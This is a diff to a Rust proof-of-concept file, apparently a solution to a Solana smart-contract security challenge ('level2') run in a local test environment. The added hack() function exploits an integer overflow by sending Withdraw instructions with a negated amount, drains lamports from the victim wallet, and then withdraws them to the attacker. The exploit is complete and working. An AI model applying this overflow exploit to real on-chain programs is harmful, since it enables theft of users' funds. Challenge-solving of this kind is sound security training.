@@ -7,17 +7,99 @@ use poc_framework::{
 };
 use solana_program::native_token::lamports_to_sol;
 
+use solana_program::rent::Rent;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+
+use borsh::BorshSerialize;
+use level2::{WalletInstruction, get_wallet_address};
+use solana_program::instruction::{AccountMeta, Instruction};
+use solana_program::sysvar;
+
 
 struct Challenge {
     hacker: Keypair,
     wallet_program: Pubkey,
-    wallet_address: Pubkey,
-    wallet_authority: Pubkey,
+    wallet_address: Pubkey, // @audit victim wallet
+    wallet_authority: Pubkey, // @audit victim authority
 }
 
+// @audit the vulnerbility will allow 
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // create hackers wallet
+    env.execute_as_transaction(
+        &[level2::initialize(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+        )],
+        &[&challenge.hacker],
+    ).assert_success();
+
+    let hacker_wallet = get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);
+
+    println!("[***]Initial funds{}",env.get_account(hacker_wallet).unwrap().lamports);
+
+    let to_transfer = Rent::default().minimum_balance(8);
+    println!("To transfer: {}", to_transfer);
+    //let to_transfer = 1_000_000u64;
+    let overflow = (-(to_transfer as i64)) as u64;
+
+    let iters = 5;
+
+    for i in 0..iters {
+        let tx = env.execute_as_transaction(
+            &[Instruction {
+                program_id: challenge.wallet_program,
+                accounts: vec![
+                    AccountMeta::new(hacker_wallet, false),              // source wallet
+                    AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
+                    AccountMeta::new(challenge.wallet_address, false),   // target wallet
+                    AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
+                ],
+                data: WalletInstruction::Withdraw { amount: overflow+i }.try_to_vec().unwrap(),
+            }],
+            &[&challenge.hacker],
+        );
+        tx.print_named(&format!("haxx {}", i));
+    }
+    
+
+    let tx = env.execute_as_transaction(
+        &[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet, false),              // source wallet
+                AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
+                AccountMeta::new(challenge.hacker.pubkey(), false),  // target wallet
+                AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
+            ],
+            data: WalletInstruction::Withdraw { amount: to_transfer*iters-1000 }.try_to_vec().unwrap(),
+        }],
+        &[&challenge.hacker],
+    );
+    tx.print_named("hacker withdraw");
+
+    println!("[***]After funds{}",env.get_account(hacker_wallet).unwrap().lamports);
+}
+
+
+
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+// fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+//     env.execute_as_transaction(
+//         &[level2::initialize(
+//             challenge.wallet_program,
+//             challenge.hacker.pubkey(),
+//         )],
+//         &[&challenge.hacker],
+//     ).assert_success();
+
+//     let minimal_balance = Rent::default().minimum_balance(level2::WALLET_LEN);
+
+//     let wallet_address = level2::get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);
+
+
+
+// }
 
 /*
 SETUP CODE BELOW
